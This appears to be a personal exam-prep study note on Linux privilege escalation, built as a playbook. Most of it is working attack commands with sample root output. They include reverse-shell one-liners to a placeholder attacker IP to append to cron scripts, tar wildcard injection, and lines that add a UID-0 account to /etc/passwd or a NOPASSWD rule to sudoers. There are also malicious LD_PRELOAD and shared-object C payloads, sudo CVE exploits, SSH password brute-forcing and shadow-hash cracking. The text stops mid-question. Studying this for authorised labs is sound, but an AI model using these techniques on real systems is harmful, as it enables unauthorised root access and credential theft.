Master Checklist#

NEXT ACTIONPhase 0 — Establish Context (do this the second you land a shell)
  • id — who am I, what groups (UID 0 = root; sudo/adm groups matter).
  • sudo -l — the single highest-value command. What can I run as root?
  • hostname + cat /etc/issue + cat /etc/os-release + uname -a — OS flavor, version, kernel, architecture.
  • cat /etc/passwd — enumerate every user; note non-service accounts (real home dir + login shell).
NEXT ACTIONPhase 1 — Manual Enumeration
  • ps aux — root-owned processes worth researching.
  • ip a / routel / ss -anp — interfaces (multi-homed = pivot), routes, loopback-only services.
  • cat /etc/iptables/rules.v4 — non-default firewall rules (locally-reachable services).
  • ls -lah /etc/cron* + crontab -l + sudo crontab -l — scheduled jobs (run as root?).
  • dpkg -l (Debian) / rpm (RHEL) — installed apps + versions for exploit matching.
  • find / -writable -type d 2>/dev/null — world-writable directories.
  • find / -perm -u=s -type f 2>/dev/null — SUID binaries.
  • /usr/sbin/getcap -r / 2>/dev/null — file capabilities (cap_setuid+ep is gold).
  • cat /etc/fstab + mount + lsblk — unmounted drives with loot.
  • lsmod + /sbin/modinfo <module> — loaded drivers for kernel-module exploits.
NEXT ACTIONPhase 2 — Automated Enumeration (after manual)
  • unix-privesc-check standard > output.txt (pre-installed on Kali).
  • Run LinPEAS / LinEnum — but trust manual findings over tool output for one-off misconfigs.
NEXT ACTIONPhase 3 — Hunt Exposed Credentials
  • env + cat ~/.bashrc — creds in environment variables.
  • History files (.bash_history), config files, scripts under writable dirs.
  • watch -n 1 "ps -aux | grep pass" — creds passed on process command lines.
  • sudo tcpdump -i lo -A | grep "pass" — clear-text creds on loopback (if granted).
NEXT ACTIONPhase 4 — Exploit a Misconfiguration → root
  • Writable cron script → reverse-shell one-liner.
  • Writable /etc/passwd → add UID 0 user.
  • SUID binary / capability → GTFOBins shell.
  • sudo allowed command → GTFOBins escalation.
  • Kernel exploit (last resort — crash risk).
  • Confirm: id shows uid=0(root).

Trigger-Based Decision Workflow#

CHECKWorkflow A — "I just got a shell. Now what?"
  1. id → am I already root? am I in sudo/adm/docker?
  2. sudo -l → if it lists anything, jump straight to #Technique — Abusing Sudo. This is the fastest win on the exam.
  3. Fingerprint OS/kernel (#Technique — OS, Kernel & Architecture Fingerprint) — keep it for the kernel-exploit path.
  4. cat /etc/passwd → identify other real users to pivot to.
CHECKWorkflow B — "Hunt the low-hanging fruit (credentials) first"

Time-constrained engagements reward credential hunting before complex exploits.

  • env / .bashrc → exported secrets.
  • History + config files + writable scripts.
  • watch ... ps ... grep pass and (if permitted) sudo tcpdump → creds in motion.
  • Found a password? Try su - root, try it against other users, and build a wordlist from it (crunch → hydra).

→ #Credential Harvesting Workflow

CHECKWorkflow C — "Look for insecure permissions"

Order by reliability/speed:

  1. Writable cron script that root executes → reverse shell within ~1 min → #Technique — Abusing Cron Jobs.
  2. Writable /etc/passwd → add a UID-0 user → #Technique — Abusing Writable /etc/passwd.
  3. SUID binary (find -perm -u=s) → GTFOBins → #Technique — Abusing SUID Binaries.
  4. Capability cap_setuid+ep → GTFOBins → #Technique — Abusing Capabilities.
CHECKWorkflow D — "Nothing easy worked"
  1. Re-check sudo -l GTFOBins entries (watch for AppArmor/MAC blocks — pick a different allowed binary).
  2. Kernel exploit as last resort (crash risk; alerts admins) → #Technique — Kernel Exploits.

Technique Pattern Bank#

Technique — User & System Context#

Trigger Words: "fresh shell", "who am I", "what users exist".

TIPTrigger

First action after landing on any Linux host.

EXAMPLECommand
BASH
id
cat /etc/passwd
hostname
SUCCESSWhat Good Output Looks Like

uid=1000(joe) gid=1000(joe) groups=... and a /etc/passwd listing where service accounts use /usr/sbin/nologin and real users (e.g. eve:x:1001:1001:,,,:/home/eve:/bin/bash) have a home directory + interactive shell.

INFOReading /etc/passwd fields

login:x:UID:GID:comment:home:shell — x means the hash lives in /etc/shadow; UID 0 = root; regular users start at 1000. nologin shells = service accounts you usually can't log into.

NEXT ACTIONNext Action

Note every real user as a pivot target. Run sudo -l. Then fingerprint the OS → #Technique — OS, Kernel & Architecture Fingerprint.

Technique — OS, Kernel & Architecture Fingerprint#

Trigger Words: "need kernel version", "matching an exploit", "what distro".

TIPTrigger

Before searching for any kernel/application exploit — a mismatched kernel exploit can crash the box.

EXAMPLECommand
BASH
cat /etc/issue
cat /etc/os-release
uname -a          # full: kernel + arch in one line
uname -r          # kernel release only  (e.g. 4.4.0-116-generic)
arch              # architecture          (e.g. x86_64)
SUCCESSWhat Good Output Looks Like

e.g. Debian GNU/Linux 10 (buster), Linux ... 4.19.0-21-amd64 ... x86_64. You now have distro + kernel + arch — the three facts a kernel exploit must match.

WARNINGWhat This Means

Kernel exploits are tied to a specific OS-flavor + version + arch combo. A wrong match → instability or crash → guaranteed to alert admins. Keep this fingerprint for #Technique — Kernel Exploits and test exploits locally first.

NEXT ACTIONNext Action

Park the fingerprint. Move to easier vectors first (creds, cron, SUID, sudo). Return here only if those fail.

Technique — Process, Network & Service Enumeration#

Trigger Words: "what runs as root", "is this box multi-homed", "loopback-only service".

TIPTrigger

Building a baseline of attack surface after context is established.

EXAMPLECommand
BASH
ps aux                       # a+x = all procs w/ or w/o tty, u = user-readable
ip a                         # or: ifconfig -a
routel                       # or: route
ss -anp                      # or: netstat -anp  (a=all n=no-resolve p=process)
cat /etc/iptables/rules.v4   # often world-readable; reveals firewall rules
dpkg -l                      # Debian installed packages (rpm on RHEL)
lsmod                        # loaded kernel modules
/sbin/modinfo <module>       # detail on a module (needs full path)
SUCCESSWhat Good Output Looks Like

Root-owned services (apache2, custom daemons), a second NIC (e.g. ens224 172.16.60.214 → pivot candidate), a service bound to 127.0.0.1:<port> (locally-exploitable), or a non-default firewall ACCEPT rule (e.g. dport 1999).

CHECKDecision Logic
  • Service only on loopback + blocked by firewall remotely → exploit it locally to escalate.
  • Second interface on an internal subnet → note for pivoting/tunneling (see Windows-PrivEsc-OSCP-Methodology / SSH tunneling module).
  • Installed app with a known CVE → application exploit path.
NEXT ACTIONNext Action

Cross-reference dpkg -l versions and lsmod modules against searchsploit. Move on to permissions/creds.

Technique — Cron Job Discovery#

Trigger Words: "scheduled task", "cron", "runs every minute".

TIPTrigger

Looking for jobs that execute as root on a timer — a top Linux escalation vector.

EXAMPLECommand
BASH
ls -lah /etc/cron*                 # /etc/crontab, cron.d, cron.{hourly,daily,weekly,monthly}
crontab -l                         # current user's jobs
sudo crontab -l                    # root's jobs (if you have the sudo right)
grep "CRON" /var/log/syslog        # observe what actually fires, and as whom
SUCCESSWhat Good Output Looks Like

A root job pointing at a script you might control, e.g.:

SHELL
* * * * * /bin/bash /home/joe/.scripts/user_backups.sh
(root) CMD ( /bin/bash /home/joe/.scripts/user_backups.sh )
WARNINGWhat This Means

If that script (or its directory) is writable by you, root will execute your code on the next tick → #Technique — Abusing Cron Jobs. Always check the file's permissions next.

NEXT ACTIONNext Action

ls -lah <SCRIPT_PATH>; if writable → weaponize. Also run find / -writable -type d 2>/dev/null to spot writable script dirs.

Technique — Abusing Cron Jobs#

Trigger Words: "writable root cron script", "-rwxrwxrw- owned by root".

TIPTrigger

A root-executed cron script (or its dir) is writable by your user.

EXAMPLECommand
BASH
# Confirm it's writable and root-owned
cat <SCRIPT_PATH>
ls -lah <SCRIPT_PATH>          # e.g. -rwxrwxrw- 1 root root ... user_backups.sh

# Append a reverse-shell one-liner (verbatim style from Listing 491)
echo >> <SCRIPT_PATH>
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 1234 >/tmp/f" >> <SCRIPT_PATH>

# On Kali, catch it (root shell within ~1 minute)
nc -lnvp 1234
SUCCESSWhat Good Output Looks Like
SHELL
connect to [<KALI_IP>] from (UNKNOWN) [<TARGET_IP>] ...
# id
uid=0(root) gid=0(root) groups=0(root)
CHECKDecision Logic

Reverse shell is cleaner than embedding a persistent change. If the cron interval is long, consider a faster vector (SUID/sudo) first.

NEXT ACTIONNext Action

Stabilize the root shell; loot /root, /etc/shadow. Pivot → Active-Directory-OSCP-Methodology if domain-joined.

Technique — Abusing Writable /etc/passwd#

Trigger Words: "/etc/passwd world-writable", "World write is set for /etc/passwd".

TIPTrigger

unix-privesc-check or ls -l /etc/passwd shows the file is writable by non-root.

INFOWhy this works

A password hash in the second field of an /etc/passwd record is honored for auth and takes precedence over /etc/shadow (backwards compatibility). Write access to /etc/passwd = set any account's password, including a new UID-0 superuser.

EXAMPLECommand
BASH
openssl passwd w00t                 # -> e.g. Fdzt.eqJQ4s0g  (crypt by default)
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2                            # password: w00t
SUCCESSWhat Good Output Looks Like
SHELL
root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)

The 0:0 fields make root2 a superuser.

WARNINGNote

openssl passwd output algorithm varies by system (crypt/DES/MD5) — it still works for /etc/passwd auth.

NEXT ACTIONNext Action

You are root via a second account. Dump /etc/shadow; clean up root2 if operationally required.

Technique — Abusing SUID Binaries#

Trigger Words: "SUID", "-perm -u=s", "rwsr-xr-x", "euid=0".

TIPTrigger

find / -perm -u=s -type f 2>/dev/null returns a binary you can abuse (custom or GTFOBins-listed).

INFOConcept (real vs effective UID)

A SUID binary runs with the file owner's UID, not the caller's. If owned by root, it runs as root. Verify on a live process: ps u -C passwd (USER=root) and grep Uid /proc/<PID>/status → Uid: 1000 0 0 0 (real=1000, effective=0). The s in rwsr-xr-x is the SUID bit (chmod u+s).

EXAMPLECommand
BASH
find / -perm -u=s -type f 2>/dev/null

# Example: misconfigured `find` has SUID -> spawn a preserved-privilege shell
find /home/<USERNAME>/Desktop -exec "/usr/bin/bash" -p \;
id      # uid=1000(joe) ... euid=0(root)
SUCCESSWhat Good Output Looks Like

bash-5.0# prompt; whoami → root; id shows euid=0(root) even though the real UID is unchanged. The -p flag (Bash Set builtin) prevents the effective UID from being reset.

CHECKDecision Logic

For any SUID binary you don't recognize, look it up on GTFOBins → use the listed SUID invocation. If /bin/cp were SUID, you could overwrite /etc/passwd or /etc/shadow directly.

NEXT ACTIONNext Action

Got euid=0? Loot as root. Otherwise check capabilities → #Technique — Abusing Capabilities.

Technique — Abusing Capabilities#

Trigger Words: "getcap", "cap_setuid+ep", "perl/python capability".

TIPTrigger

getcap -r / 2>/dev/null shows a binary with an exploitable capability (esp. cap_setuid).

EXAMPLECommand
BASH
/usr/sbin/getcap -r / 2>/dev/null
# e.g. /usr/bin/perl = cap_setuid+ep

# GTFOBins payload for perl's cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
id      # uid=0(root)
SUCCESSWhat Good Output Looks Like

# id → uid=0(root) gid=1000(joe) .... The +ep flags mean the capability is effective and permitted.

INFOConcept

Capabilities split root's powers into discrete units assignable to binaries. cap_setuid lets a program set its UID to 0 → root shell. Capabilities, setuid, and the SUID flag live in different parts of the ELF — check all of them.

NEXT ACTIONNext Action

Map any capability-bearing binary to its GTFOBins "Capabilities" entry and run the listed payload.

Technique — Abusing Sudo#

Trigger Words: "sudo -l", "(ALL : ALL) ALL", "may run the following commands", "NOPASSWD".

TIPTrigger

sudo -l lists any command you can run as root. Run this first on every box.

EXAMPLECommand
BASH
sudo -l
# Best case:
#   (ALL : ALL) ALL          -> sudo -i           (full root shell)
# Constrained case (specific binaries):
#   (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
SUCCESSWhat Good Output Looks Like

(ALL : ALL) ALL → instant root via sudo -i. Otherwise a list of allowed binaries — take each to GTFOBins for the sudo escalation payload, e.g.:

BASH
sudo apt-get changelog apt
!/bin/sh                       # drops to a root shell
WARNINGDefenses can block GTFOBins payloads

In the PDF, the tcpdump GTFOBins payload fails with permission denied — AppArmor (kernel MAC) confines /usr/sbin/tcpdump. Confirm with cat /var/log/syslog | grep tcpdump (look for apparmor="DENIED") and aa-status. Lesson: if one allowed binary is confined, try the next one (here apt-get succeeded).

CHECKDecision Logic

Triage the sudo -l list by GTFOBins viability: anything that can spawn a shell, read/write arbitrary files, or load code. Skip binaries with restrictive args you can't bend (e.g. crontab -l).

NEXT ACTIONNext Action

Got root via sudo? Done — verify id. If every entry is confined/non-exploitable, fall back to #Technique — Kernel Exploits.

Technique — Automated Enumeration#

Trigger Words: "run a script", "bulk enumerate", "LinPEAS".

TIPTrigger

After manual enumeration, to catch anything you missed quickly.

EXAMPLECommand
BASH
unix-privesc-check            # usage banner: standard | detailed
./unix-privesc-check standard > output.txt
SUCCESSWhat Good Output Looks Like

Flags like WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd → directly actionable (#Technique — Abusing Writable /etc/passwd).

INFOCourse-sanctioned tools

The PDF names unix-privesc-check (pre-installed on Kali at /usr/bin/unix-privesc-check), LinEnum, and LinPEAS as Linux privesc enumeration tools.

WARNINGDon't trust tools blindly

Automated tools miss unique, one-off misconfigurations. Always also enumerate manually (Phase 1).

NEXT ACTIONNext Action

Feed findings back into the relevant technique. Manual + automated together.

Credential Harvesting Workflow#

INFO"Exposed Confidential Information" (§17.2)

History/config files and service footprints are the low-hanging fruit — check them before complex exploits.

TIPTrigger

Any time you need a password to su, SSH to another user, or feed sudo.

User Trails (§17.2.1)#

EXAMPLECommand
BASH
env                               # look for secrets, e.g. SCRIPT_CREDENTIALS=lab
cat ~/.bashrc                     # confirm an exported var is permanent
# try the found secret directly:
su - root
SUCCESSWhat Good Output Looks Like

An env var like SCRIPT_CREDENTIALS=lab, confirmed by export SCRIPT_CREDENTIALS="lab" in .bashrc, that turns out to be a real password (su - root → whoami = root).

CHECKDon't stop at root

Reuse a found password against other users, or derive a wordlist from it:

BASH
crunch 6 6 -t Lab%%% > <WORDLIST>            # Lab000..Lab999
hydra -l eve -P <WORDLIST> <TARGET_IP> -t 4 ssh -V
ssh eve@<TARGET_IP>                          # then re-check: sudo -l

Service Footprints (§17.2.2)#

EXAMPLECommand
BASH
watch -n 1 "ps -aux | grep pass"             # creds passed on the command line
sudo tcpdump -i lo -A | grep "pass"          # clear-text creds on loopback (needs sudo)
SUCCESSWhat Good Output Looks Like

A root process revealing creds, e.g. sshpass -p 'Lab123' ssh -t eve@127.0.0.1 ..., or sniffed user:root,pass:lab on the loopback interface.

WARNINGtcpdump needs privilege

tcpdump requires raw sockets (a privileged op) — it only runs here because joe was granted a specific sudo right to it. You can still observe root-context processes as an unprivileged user via ps.

NEXT ACTIONNext Action

Take any recovered credential back to Workflow A: su/ssh as the new user, then sudo -l again.

Post-Compromise Enumeration Checklist#

CHECKAfter you reach root — loot & pivot
  • cat /etc/shadow — crack other users' hashes offline (reuse across hosts).
  • /root and every user's home — keys, .bash_history, configs, *.kdbx.
  • SSH private keys (~/.ssh/id_*) — reuse for lateral movement.
  • cat /etc/fstab + mount + lsblk — unmounted partitions with data.
  • DB / service config files — hard-coded creds for service accounts.
  • Second NIC (ip a) + routes (routel) — internal subnets to pivot into.
  • If domain-joined / creds found → Active-Directory-OSCP-Methodology.
INFOCross-note pivot

Recovered credentials/hashes feed the AD workflow (pass-the-hash, lateral movement) and the Windows note's post-SYSTEM steps. Keep a running creds table: user : secret : source-host : reused?.

Technique — Kernel Exploits#

Trigger Words: "old kernel", "nothing else worked", "searchsploit", "CVE".

TIPTrigger

All credential/permission/sudo paths exhausted, and the kernel is outdated.

WARNINGLast resort — crash risk

Kernel exploits depend on an exact OS-flavor + kernel + arch match. A mismatch can crash the host and alert admins/SOC. Test in a local replica first. Prefer compiling on the target (or an identical sandbox) to dodge cross-compilation/library mismatches.

EXAMPLECommand

See the Kernel exploit pipeline block above — fingerprint → searchsploit → select matching .c → read compile header (head -n 20) → gcc on target → file to verify arch → run.

SUCCESSWhat Good Output Looks Like
SHELL
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) ...
CHECKDecision Logic

Choose the exploit whose tested kernels include yours (e.g. 45010.c / CVE-2017-16995 targets < 4.13.9, matching 4.4.0-116-generic). Newer-but-matching > older.

PG Workflow — sudo Abuse (GTFOBins, env_keep, version CVEs)#

INFOSearch Keywords

sudo -l · GTFOBins · NOPASSWD · env_keep · LD_PRELOAD · LD_LIBRARY_PATH · SETENV · sudo --version · CVE-2021-3156 · CVE-2019-14287

Trigger Words: "sudo -l lists a binary", "env_keep+=LD_PRELOAD", "old sudo version", "(ALL, !root)".

Purpose: Turn any sudo right — even one constrained binary — into a root shell.

EXAMPLEStep 1 — enumerate and triage
BASH
sudo -l            # what can I run, as whom, with/without a password?
sudo --version     # version → check the two big CVEs below
EXAMPLEStep 2 — GTFOBins for each allowed binary (shell breakouts)
BASH
sudo vi -c ':!/bin/sh' /dev/null      # or inside vi:  :!sh
sudo less /etc/profile                # then:  !/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh \; -quit
sudo env /bin/sh
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo nmap --interactive               # legacy nmap only → !sh
EXAMPLEStep 3 — LD_PRELOAD / LD_LIBRARY_PATH (when sudo keeps env)
BASH
# Trigger: sudo -l shows  env_keep+=LD_PRELOAD  (or LD_LIBRARY_PATH)
cat > /tmp/x.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
void _init(){ unsetenv("LD_PRELOAD"); setuid(0); setgid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so <ANY_ALLOWED_BINARY>     # _init() runs as root → root shell
EXAMPLEStep 4 — sudo version CVEs (when GTFOBins is dead)
BASH
# CVE-2019-14287 — sudoers allows "(ALL, !root) /bin/bash" → -1 wraps to UID 0:
sudo -u#-1 /bin/bash
# CVE-2021-3156 (Baron Samedit) — heap overflow in sudo < 1.9.5p2; works even with NO sudo rights.
#   Use a distro-matched public exploit; confirm version first.
SUCCESSWhat Good Output Looks Like

# id → uid=0(root). For -u#-1, you get root despite the !root exclusion.

CHECKDecision Logic

Order: GTFOBins shell breakout → env_keep LD_PRELOAD → version CVE. If a binary is AppArmor-confined (course #Technique — Abusing Sudo), try the next allowed binary.

NEXT ACTIONNext Action

Root → #Post-Compromise Enumeration Checklist. Remove any dropped .so/files.

PG Workflow — SUID Abuse (GTFOBins, PATH hijack, shared-object injection)#

INFOSearch Keywords

find -perm -u=s · GTFOBins · bash -p · $PATH hijack · strings · strace · ldd · writable .so

Trigger Words: "custom SUID binary", "SUID calls another command", "missing/writable .so".

Purpose: Abuse a root-owned SUID binary three ways depending on what it is and what it calls.

EXAMPLEStep 1 — find and classify
BASH
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null     # SGID too
# Known binary → GTFOBins "SUID" entry. Custom binary → analyse it (Steps 3-4).
EXAMPLEStep 2 — GTFOBins SUID payloads (known binaries)
BASH
./bash -p                                   # if bash itself is SUID
./find . -exec /bin/sh -p \; -quit
./cp --no-preserve=mode /etc/shadow /tmp/   # SUID cp → read/overwrite root-owned files
# also: nano, vim, less, more, awk, nmap(old), env, python — look up the exact GTFOBins entry
EXAMPLEStep 3 — PATH hijack (custom SUID calls a command by relative name)
BASH
strings /path/to/suidbin                       # spot a bare command, e.g. "service" or "cat"
strace -f -e execve /path/to/suidbin 2>&1 | grep exec   # confirm what it execs
cd /tmp
printf '#!/bin/bash\n/bin/bash -p\n' > service && chmod +x service
export PATH=/tmp:$PATH
/path/to/suidbin                               # it runs our /tmp/service as root
EXAMPLEStep 4 — shared-object injection (writable/missing .so)
BASH
ldd /path/to/suidbin                # find a library it loads
cat > /tmp/lib.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
static void inject() __attribute__((constructor));
void inject(){ setuid(0); system("/bin/bash -p"); }
EOF
gcc -shared -fPIC -o /path/to/writable/lib.so /tmp/lib.c
/path/to/suidbin
SUCCESSWhat Good Output Looks Like

bash-5.x# id → euid=0(root). PATH/.so hijacks yield a full root shell when the SUID program runs your planted code.

CHECKDecision Logic

Recognized binary → GTFOBins. Custom binary → strings/strace for a relative-name exec (PATH hijack), else ldd for a hijackable .so.

NEXT ACTIONNext Action

Loot as root → #Post-Compromise Enumeration Checklist.

PG Workflow — cron Abuse (writable script, PATH, wildcard injection)#

INFOSearch Keywords

pspy · /etc/crontab PATH · writable script · tar/rsync wildcard · --checkpoint-action · *

Trigger Words: "root cron I can't see", "cron PATH starts with a writable dir", "cron runs tar/rsync with *".

Purpose: Get root from a scheduled job — beyond the writable-script case the course covers.

EXAMPLEStep 1 — discover (including jobs you can't read)
BASH
cat /etc/crontab                    # note the PATH= line and custom jobs
ls -la /etc/cron.d /etc/cron.*
./pspy64 -pf -i 1000                # pspy (not in PDF): see root cron/processes WITHOUT root
EXAMPLEStep 2a — writable script (course case)
BASH
echo 'bash -i >& /dev/tcp/<KALI_IP>/1234 0>&1' >> <WRITABLE_ROOT_SCRIPT>
EXAMPLEStep 2b — PATH hijack (cron PATH starts with a writable dir)
BASH
# /etc/crontab:  PATH=/home/user:/usr/bin:/bin   and a job runs a BARE command e.g. "overwrite.sh"
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\n' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
# wait for the tick, then:
/tmp/rootbash -p
EXAMPLEStep 2c — wildcard injection (cron runs tar ... * in a writable dir)
BASH
# Job: cd /writable && tar czf /backup.tgz *   → tar treats our filenames as flags:
cd /writable
echo 'bash -i >& /dev/tcp/<KALI_IP>/1234 0>&1' > runme.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh runme.sh'
# rsync variant: a file named  -e sh runme.sh   ;  chown/chmod variant: --reference=…
nc -lnvp 1234   # on Kali
SUCCESSWhat Good Output Looks Like

A root reverse shell on the next tick, or /tmp/rootbash -p → # id = root.

CHECKDecision Logic

Writable script → append shell. Bare command + writable cron PATH dir → plant the command. tar/rsync + * in a writable dir → checkpoint/-e injection. Use pspy to catch jobs absent from your crontab.

NEXT ACTIONNext Action

Root → #Post-Compromise Enumeration Checklist. Remove --checkpoint* files / restore the script.

PG Workflow — Linux Capabilities Abuse#

INFOSearch Keywords

getcap -r / · cap_setuid · cap_dac_read_search · cap_dac_override · cap_sys_admin · GTFOBins Capabilities

Trigger Words: "getcap shows +ep", "python/perl/ruby with cap_setuid", "cap_dac_read_search".

Purpose: Abuse a file capability for root or arbitrary file read/write — broader than the course's perl cap_setuid.

EXAMPLECommands by capability
BASH
/usr/sbin/getcap -r / 2>/dev/null

# cap_setuid+ep  → become root (use whichever interpreter has it):
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'

# cap_dac_read_search → READ any file (e.g. exfil /etc/shadow) via GTFOBins read primitive.
# cap_dac_override    → WRITE any file → append a UID-0 line to /etc/passwd or edit /etc/shadow.
SUCCESSWhat Good Output Looks Like

cap_setuid → # id = uid=0(root). cap_dac_* → read /etc/shadow or write /etc/passwd without being root.

CHECKDecision Logic

Map the exact capability string to its GTFOBins "Capabilities" entry. cap_setuid = direct root; cap_dac_* = file read/write you convert into root (read shadow → crack; write passwd → add UID 0).

NEXT ACTIONNext Action

Got a file-write primitive? → #Technique — Abusing Writable /etc/passwd. Else loot as root.

PG Workflow — Writable Sensitive Files (passwd, shadow, sudoers)#

INFOSearch Keywords

writable /etc/passwd · writable /etc/shadow · writable /etc/sudoers.d · readable /etc/shadow · unshadow · mkpasswd

Trigger Words: "passwd/shadow/sudoers is writable", "I can read /etc/shadow".

Purpose: A writable (or even readable) auth file is instant root.

EXAMPLEBranches
BASH
# (a) WRITABLE /etc/passwd → add a UID-0 account (see course block for the canonical form):
echo "root2:$(openssl passwd -1 -salt abc Password123):0:0:root:/root:/bin/bash" >> /etc/passwd ; su root2

# (b) WRITABLE /etc/shadow → replace root's hash with a known one:
mkpasswd -m sha-512 Password123        # paste into root's 2nd field in /etc/shadow ; then su root

# (c) WRITABLE /etc/sudoers or /etc/sudoers.d/* → grant yourself NOPASSWD:
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/pwn ; sudo -i

# (d) READABLE /etc/shadow (not writable) → crack offline:
unshadow /etc/passwd /etc/shadow > unshadowed
hashcat -m 1800 unshadowed /usr/share/wordlists/rockyou.txt   # 1800 = sha512crypt
SUCCESSWhat Good Output Looks Like

# id = root (a/b/c), or cracked root/user passwords from hashcat/john (d).

CHECKDecision Logic

Prefer writable sudoers.d (cleanest), then /etc/passwd (course path), then /etc/shadow. Readable-but-not-writable shadow → crack.

NEXT ACTIONNext Action

Root → #Post-Compromise Enumeration Checklist.

PG Workflow — Group, Service and Kernel Escalations (docker, lxd, NFS, systemd, pkexec)#

INFOSearch Keywords

id groups · docker · lxd/lxc · disk · NFS no_root_squash · writable .service · pkexec PwnKit · DirtyPipe · DirtyCow

Trigger Words: "I'm in the docker/lxd/disk group", "NFS export no_root_squash", "writable systemd unit", "pkexec SUID".

Purpose: The grab-bag of high-yield PG roots that aren't permission/sudo/cron.

EXAMPLEGroup memberships (check id first)
BASH
# docker group → mount host root and chroot:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# lxd/lxc group → privileged container that mounts the host filesystem:
lxc image import ./alpine.tar.gz --alias p; lxc init p c -c security.privileged=true
lxc config device add c host disk source=/ path=/mnt/root recursive=true; lxc start c
lxc exec c /bin/sh         # /mnt/root is the host filesystem, writable as root

# disk group → read the raw disk with debugfs:
debugfs /dev/sda1          # then: cat /root/root.txt, dump /etc/shadow
EXAMPLENFS no_root_squash (export trusts remote root)
BASH
showmount -e <TARGET_IP>                       # from Kali; find an export with no_root_squash
sudo mount -o rw <TARGET_IP>:/export /mnt
# as root on Kali, plant a SUID root shell into the export:
cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash
# back on the target:  /export/rootbash -p   → euid=0
EXAMPLEWritable systemd unit / pkexec / kernel
BASH
# writable .service → point ExecStart at your payload, then (re)start it:
#   [Service] ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb'
systemctl daemon-reload && systemctl start <unit>     # or wait for its trigger

# PwnKit (pkexec, CVE-2021-4034) — the PDF shows pkexec only as a SUID find hit, no exploit:
./PwnKit          # or a cve-2021-4034 PoC → instant root on most 2009-2021 distros

# Kernel last resort (crash risk) — match version FIRST (course path = searchsploit):
#   DirtyPipe CVE-2022-0847 (5.8–5.16), DirtyCow CVE-2016-5195 (<4.8) → [[#Technique — Kernel Exploits]]
SUCCESSWhat Good Output Looks Like

A root shell / # id = root via the chosen vector; debugfs/NFS give root-level file read or a planted SUID shell.

WARNINGPitfalls

Container/NFS/kernel routes can be noisy or destructive (lxd needs an image; kernel exploits can panic the box). On the exam they're allowed but kept as fallbacks behind sudo/SUID/cron.

CHECKDecision Logic

Check id groups first (docker/lxd/disk ≈ trivial root). Then service/NFS misconfigs. PwnKit is a reliable one-shot when pkexec is present. Kernel exploit only when all else fails → #Technique — Kernel Exploits.

Active Recall Questions#

DECISIONFirst two commands

You just landed an unprivileged shell on a Linux host. What are the first two commands you run, and why? (Answer: id — establish UID/GID/groups; and sudo -l — the single highest-value check, it may hand you root directly via a GTFOBins payload.)

DECISIONReading /etc/passwd

In joe:x:1000:1000:joe,,,:/home/joe:/bin/bash, what does the x mean, and what UID indicates root? (Answer: x = the password hash is stored in /etc/shadow, not here; UID 0 = root.)

DECISIONWritable cron script

You find -rwxrwxrw- 1 root root ... /home/joe/.scripts/user_backups.sh referenced by a root cron job running every minute. How do you get root? (Answer: append a reverse-shell one-liner to the script, start nc -lnvp <port> on Kali, wait ≤1 min for the cron tick → root reverse shell.)

DECISIONWritable /etc/passwd

Why is a world-writable /etc/passwd game over, even though hashes "should" live in /etc/shadow? (Answer: a hash in the 2nd field of /etc/passwd is still honored and takes precedence over /etc/shadow. Generate one with openssl passwd, append a :0:0: line → new root account, su to it.)

DECISIONSUID vs capability

What does find / -perm -u=s -type f find, and what's the analogous command for capabilities? (Answer: SUID-bit binaries (run as the file owner, e.g. root). Capabilities equivalent: getcap -r / 2>/dev/null; cap_setuid+ep is the prize.)

DECISIONThe -p flag

When abusing a SUID bash/binary, why include -p (e.g. bash -p)? (Answer: it prevents Bash from resetting the effective UID back to the real UID, so you keep euid=0 and stay root.)

DECISIONsudo GTFOBins blocked

Your sudo tcpdump GTFOBins payload returns "permission denied." What happened, and what do you do? (Answer: AppArmor (kernel MAC) confines /usr/sbin/tcpdump — confirm via apparmor="DENIED" in syslog and aa-status. Move to the next allowed binary, e.g. apt-get.)

DECISIONDeriving a wordlist

You found the password lab/SCRIPT_CREDENTIALS. How do you turn one known secret into access to user eve? (Answer: build a targeted wordlist with crunch (e.g. crunch 6 6 -t Lab%%%), then hydra -l eve -P wordlist <ip> ssh → log in via SSH → sudo -l.)

DECISIONKernel exploit safety

Before running a kernel exploit, what three facts must match, and what's the operational risk? (Answer: distro/OS flavor, kernel version, and architecture must all match. Risk: a mismatch can crash the host and alert admins — test locally first; it's a last resort.)

DECISIONAutomated vs manual

Why not just run LinPEAS and call it done? (Answer: automated tools miss unique one-off misconfigurations specific to a target; manual enumeration catches what scripts overlook. Use both, lead with manual context.)

DECISIONsudo env_keep (PG)

sudo -l shows env_keep+=LD_PRELOAD and one allowed binary. How do you get root? (Answer: compile a malicious shared object with an _init/constructor that calls setuid(0); system("/bin/bash"), then sudo LD_PRELOAD=/tmp/x.so <allowed_binary> — the library loads as root before the binary runs.)

DECISIONCustom SUID, no GTFOBins (PG)

